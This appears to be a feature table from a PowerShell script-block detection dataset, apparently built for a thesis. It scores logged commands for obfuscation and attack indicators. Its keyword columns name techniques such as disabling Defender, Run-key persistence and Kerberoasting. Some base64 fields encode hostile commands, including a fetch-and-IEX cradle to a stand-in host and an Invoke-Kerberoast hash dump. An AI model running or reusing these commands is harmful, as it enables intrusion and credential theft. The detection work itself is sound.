id,lexical_input_source,analysis_length,line_count,token_count,special_char_count,special_char_ratio,digit_ratio,whitespace_ratio,entropy,quoted_literal_count,short_literal_count,joined_literal_length,base64_candidate_count,longest_base64_candidate,decoded_view_count,backtick_count,concat_operator_count,join_operator_count,format_operator_count,char_cast_count,suspicious_mixed_case_count,suspicious_mixed_case_tokens,execution_hit_count,execution_hits,raw_execution_hit_count,recovered_execution_hit_count,decoded_execution_hit_count,download_hit_count,download_hits,raw_download_hit_count,recovered_download_hit_count,decoded_download_hit_count,network_c2_hit_count,network_c2_hits,raw_network_c2_hit_count,recovered_network_c2_hit_count,decoded_network_c2_hit_count,defense_evasion_hit_count,defense_evasion_hits,raw_defense_evasion_hit_count,recovered_defense_evasion_hit_count,decoded_defense_evasion_hit_count,persistence_hit_count,persistence_hits,raw_persistence_hit_count,recovered_persistence_hit_count,decoded_persistence_hit_count,credential_access_hit_count,credential_access_hits,raw_credential_access_hit_count,recovered_credential_access_hit_count,decoded_credential_access_hit_count,lolbin_hit_count,lolbin_hits,raw_lolbin_hit_count,recovered_lolbin_hit_count,decoded_lolbin_hit_count,collection_hit_count,collection_hits,raw_collection_hit_count,recovered_collection_hit_count,decoded_collection_hit_count,remote_execution_hit_count,remote_execution_hits,raw_remote_execution_hit_count,recovered_remote_execution_hit_count,decoded_remote_execution_hit_count,discovery_hit_count,discovery_hits,raw_discovery_hit_count,recovered_discovery_hit_count,decoded_discovery_hit_count,indicator_category_count,high_risk_category_count,raw_indicator_hit_count,indicator_hit_count,recovered_indicator_hit_count,decoded_indicator_hit_count
PST-176,windows_event_4104_scriptblocktext,80,1,8,8,0.1,0.0125,0.1125,4.588574,0,0,0,0,0,0,0,0,0,0,0,1,ConvertTo-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-177,windows_event_4104_scriptblocktext,139,1,11,29,0.208633,0.0,0.043165,5.142147,1,0,97,0,0,0,0,0,0,0,0,4,FILes.examPlE.invAlid;InvokE-wEbrEquEsT;UpdATe.BIN;UpdATe.BiN,0,,0,0,0,1,invoke-webrequest,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-178,windows_event_4104_scriptblocktext,124,1,8,24,0.193548,0.032258,0.016129,5.313558,1,0,84,1,24,1,0,0,0,0,0,1,FromBase64String,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-179,windows_event_4104_scriptblocktext,289,1,37,102,0.352941,0.0,0.048443,5.256116,14,8,186,0,0,0,6,0,1,1,0,3,BlOb.tXT;CErtUTiL.exe;THesIs_iNErT_,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-180,windows_event_4104_scriptblocktext,88,1,7,6,0.068182,0.034091,0.079545,4.67758,0,0,0,0,0,0,0,0,0,0,0,2,Get-CimInstance;HotFixID,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-181,windows_event_4104_scriptblocktext,134,1,11,19,0.141791,0.0,0.074627,4.837607,1,0,94,0,0,0,0,0,0,0,0,1,Resolve-DnsName,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-182,windows_event_4104_scriptblocktext,82,1,8,6,0.073171,0.012195,0.097561,4.506764,0,0,0,0,0,0,0,0,0,0,0,1,Get-LocalUser,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-183,windows_event_4104_scriptblocktext,50,1,7,6,0.12,0.02,0.14,4.375338,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-184,windows_event_4104_scriptblocktext,44,1,6,5,0.113636,0.022727,0.113636,4.354223,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-185,windows_event_4104_scriptblocktext,174,1,15,54,0.310345,0.022989,0.126437,4.917267,11,11,84,0,0,1,0,10,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-186,windows_event_4104_scriptblocktext,52,1,4,4,0.076923,0.0,0.076923,4.298635,0,0,0,0,0,0,0,0,0,0,0,1,Get-NetFirewallProfile,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-187,windows_event_4104_scriptblocktext,130,1,14,30,0.230769,0.030769,0.015385,5.338145,1,0,90,0,0,1,6,0,0,0,0,2,VEhFU0lTLUlORVJ;omBase64Stri,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-188,windows_event_4104_scriptblocktext,161,1,13,12,0.074534,0.006211,0.080745,4.722797,1,1,16,0,0,0,0,0,0,0,0,1,Get-ComputerInfo,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-189,windows_event_4104_scriptblocktext,101,1,12,16,0.158416,0.019802,0.089109,4.584556,1,0,39,0,0,0,2,0,0,0,0,1,ConvertFrom-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-190,windows_event_4104_scriptblocktext,142,1,14,19,0.133803,0.007042,0.126761,4.628503,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-191,windows_event_4104_scriptblocktext,482,1,10,25,0.051867,0.051867,0.006224,4.842355,1,0,360,1,360,1,0,0,0,0,0,2,FromBase64String;JAB4AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIABNAHMAWABtAGwAMgAuAFMAZQByAHYAZQByAFgAbQBsAEgAdAB0AHAAOwAgACQAeAAuAE8AcABlAG4AKAAnAEcARQBUACcALAAnAGgAdAB0AHAAcwA6AC8ALwB4AG0AbAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AdABhAHMAawAnACwAJABmAGEAbABzAGUAKQA7ACAAJAB4AC4AUwBlAG4AZAAoACkAOwAgAEkARQBYACAAJAB4AC4AUgBlAHMAcABvAG4AcwBlAFQAZQB4AHQA,1,iex,0,1,1,2,responseText;serverxmlhttp,0,2,2,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,4,3,3
PST-192,windows_event_4104_scriptblocktext,338,1,10,25,0.073964,0.029586,0.008876,4.962221,1,0,216,1,216,1,0,0,0,0,0,2,FromBase64String;JABjAG0AZAA9ACgAJwBJAG4AdgAnACsAJwBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AJwApADsAIAAmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAkAGMAbQBkACkAIAAiAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJwBUAEgARQBTAEkAUwAtAEkATgBFAFIAVAAnACIA,1,get-command,0,1,1,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-193,windows_event_4104_scriptblocktext,95,1,11,16,0.168421,0.010526,0.073684,4.997834,1,1,16,0,0,0,0,0,0,0,0,1,ConvertTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-194,windows_event_4104_scriptblocktext,176,1,16,52,0.295455,0.0,0.147727,4.582672,11,11,86,0,0,0,0,10,0,0,0,1,Set-MpP,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,disableRealtimeMonitoring;exclusionpath;set-mppreference,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-195,windows_event_4104_scriptblocktext,101,1,6,5,0.049505,0.0,0.059406,4.511301,0,0,0,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-196,windows_event_4104_scriptblocktext,120,1,18,24,0.2,0.041667,0.075,4.776456,2,0,79,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-197,windows_event_4104_scriptblocktext,262,1,14,30,0.114504,0.015267,0.045802,5.114243,1,0,218,1,72,1,0,0,0,0,0,0,,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-198,windows_event_4104_scriptblocktext,262,1,14,30,0.114504,0.015267,0.045802,5.359819,1,0,218,1,72,1,0,0,0,0,0,7,ENcOdedcomManD;ExEcUTe;NEW-sCHeDuLedtaskAcTioN;NoPROfILE;POwErshelL.eXE;TasKNAmE;reGiStER-SCheDULEDtAsK,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-199,windows_event_4104_scriptblocktext,170,1,14,62,0.364706,0.0,0.147059,4.478956,10,10,81,0,0,0,0,9,0,0,0,0,,1,get-command,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-200,windows_event_4104_scriptblocktext,182,1,21,47,0.258242,0.005495,0.043956,5.190571,1,0,140,0,0,0,5,0,0,0,0,1,MsXml2.ServerXmlHttp,1,iex,1,0,0,2,responseText;serverxmlhttp,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-201,windows_event_4104_scriptblocktext,163,1,14,24,0.147239,0.006135,0.055215,4.949759,2,0,78,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-202,windows_event_4104_scriptblocktext,295,1,39,99,0.335593,0.00339,0.050847,5.261248,14,10,186,0,0,0,10,0,1,0,0,2,MiCrOsof;rSheLl,1,windowstyle hidden,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,3,3,0
PST-203,windows_event_4104_scriptblocktext,80,1,10,14,0.175,0.0,0.0625,4.680998,1,0,42,0,0,0,2,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-204,windows_event_4104_scriptblocktext,91,1,7,18,0.197802,0.021978,0.032967,4.999001,1,0,53,0,0,0,0,0,0,0,0,4,ENtRypOiNT;RundLL32.eXE;sTaGE.dLl;thesis_InERt__,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-205,windows_event_4104_scriptblocktext,105,1,11,13,0.12381,0.028571,0.114286,4.651701,1,1,6,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_process,1,0,0,1,0,1,1,0,0
PST-206,windows_event_4104_scriptblocktext,107,1,10,9,0.084112,0.009346,0.084112,4.56471,0,0,0,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-207,windows_event_4104_scriptblocktext,235,1,34,40,0.170213,0.008511,0.076596,4.8856,1,0,195,0,0,0,12,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-208,windows_event_4104_scriptblocktext,136,1,10,9,0.066176,0.007353,0.073529,4.590326,1,1,16,1,25,0,0,0,0,0,0,1,Get-MpPreference,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,disableRealtimeMonitoring,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-209,windows_event_4104_scriptblocktext,167,1,23,33,0.197605,0.053892,0.095808,5.057195,3,0,88,0,0,0,0,0,0,0,0,1,ForEach-Object,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-210,windows_event_4104_scriptblocktext,227,1,23,72,0.317181,0.004405,0.123348,4.884092,11,11,135,0,0,0,0,10,0,0,0,2,MsXml2.Serve;rXmlHttp,1,iex,1,0,0,2,responseText;serverxmlhttp,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-211,windows_event_4104_scriptblocktext,193,1,22,67,0.34715,0.0,0.025907,4.815399,12,12,84,0,0,0,0,0,1,0,0,1,Get-ItemP,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,0,1,0,0,1,1,0
PST-212,windows_event_4104_scriptblocktext,118,1,11,33,0.279661,0.0,0.169492,4.331442,8,8,45,0,0,0,0,7,0,0,0,1,tTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,0,1,0,0,,0,0,0,0,,0,0,0,1,0,0,1,1,0
PST-213,windows_event_4104_scriptblocktext,184,1,17,26,0.141304,0.027174,0.092391,4.994522,1,1,8,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-214,windows_event_4104_scriptblocktext,151,1,18,55,0.364238,0.013245,0.02649,4.994667,9,9,53,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-215,windows_event_4104_scriptblocktext,133,1,14,12,0.090226,0.022556,0.112782,4.824453,1,1,5,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-216,windows_event_4104_scriptblocktext,92,1,8,19,0.206522,0.021739,0.032609,5.022332,1,0,54,0,0,0,1,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-217,windows_event_4104_scriptblocktext,110,1,10,17,0.154545,0.0,0.063636,4.847486,1,0,70,0,0,0,0,0,0,0,0,3,ErRoRaCTION;REcUrSe;SILeNTlyCOntInUE,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-218,windows_event_4104_scriptblocktext,77,1,8,8,0.103896,0.012987,0.103896,4.675289,1,1,16,0,0,0,0,0,0,0,0,1,Get-TimeZone,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-219,windows_event_4104_scriptblocktext,107,1,11,9,0.084112,0.018692,0.102804,4.584359,1,1,16,0,0,0,0,0,0,0,0,1,Get-LocalGroup,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-220,windows_event_4104_scriptblocktext,52,1,4,4,0.076923,0.0,0.076923,4.344107,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-221,windows_event_4104_scriptblocktext,209,1,21,41,0.196172,0.014354,0.086124,5.18149,4,3,35,0,0,0,0,0,0,0,0,2,ForEach-Object;Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-222,windows_event_4104_scriptblocktext,164,1,21,55,0.335366,0.02439,0.134146,4.726165,11,11,76,0,0,0,0,10,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,0,1,0,0,,0,0,0,0,,0,0,0,1,0,0,1,1,0
PST-223,windows_event_4104_scriptblocktext,310,1,10,26,0.083871,0.022581,0.009677,5.092824,1,0,188,1,188,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,1,2,1,1,2,1,1
PST-224,windows_event_4104_scriptblocktext,169,1,22,57,0.337278,0.0,0.047337,5.017802,11,10,75,0,0,0,3,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-225,windows_event_4104_scriptblocktext,64,1,7,6,0.09375,0.015625,0.109375,4.270765,0,0,0,0,0,0,0,0,0,0,0,1,Get-NetAdapter,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-226,windows_event_4104_scriptblocktext,129,1,16,22,0.170543,0.015504,0.069767,4.646584,2,0,84,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-227,windows_event_4104_scriptblocktext,201,1,32,58,0.288557,0.064677,0.024876,5.067729,1,0,157,0,0,0,10,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-228,windows_event_4104_scriptblocktext,118,1,12,10,0.084746,0.016949,0.101695,4.544537,1,1,16,0,0,0,0,0,0,0,0,1,Get-DnsClientCache,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-229,windows_event_4104_scriptblocktext,85,1,11,16,0.188235,0.047059,0.047059,4.634473,1,0,57,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-230,windows_event_4104_scriptblocktext,126,1,9,22,0.174603,0.0,0.047619,4.916271,1,0,86,1,25,0,0,0,0,0,0,1,Set-MpPreference,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,disableRealtimeMonitoring;exclusionpath;set-mppreference,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-231,windows_event_4104_scriptblocktext,210,1,18,17,0.080952,0.004762,0.090476,4.669413,2,0,64,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-232,windows_event_4104_scriptblocktext,116,1,12,10,0.086207,0.017241,0.103448,4.552494,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-233,windows_event_4104_scriptblocktext,103,1,11,21,0.203883,0.009709,0.135922,4.78982,3,3,30,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-234,windows_event_4104_scriptblocktext,322,1,10,25,0.07764,0.021739,0.009317,4.972335,1,0,200,1,200,1,0,0,0,0,0,2,FromBase64String;SQBuAHYAbwBrAGUALQBLAGUAcgBiAGUAcgBvAGEAcwB0ACAALQBPAHUAdABwAHUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAsAEgAYQBzAGgA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,3,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,3
PST-235,windows_event_4104_scriptblocktext,169,1,17,15,0.088757,0.011834,0.106509,4.708653,2,1,25,0,0,0,0,0,0,0,0,1,Get-NetFirewallRule,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-236,windows_event_4104_scriptblocktext,83,1,9,10,0.120482,0.024096,0.13253,4.359737,1,0,46,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-237,windows_event_4104_scriptblocktext,85,1,8,8,0.094118,0.011765,0.094118,4.599599,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
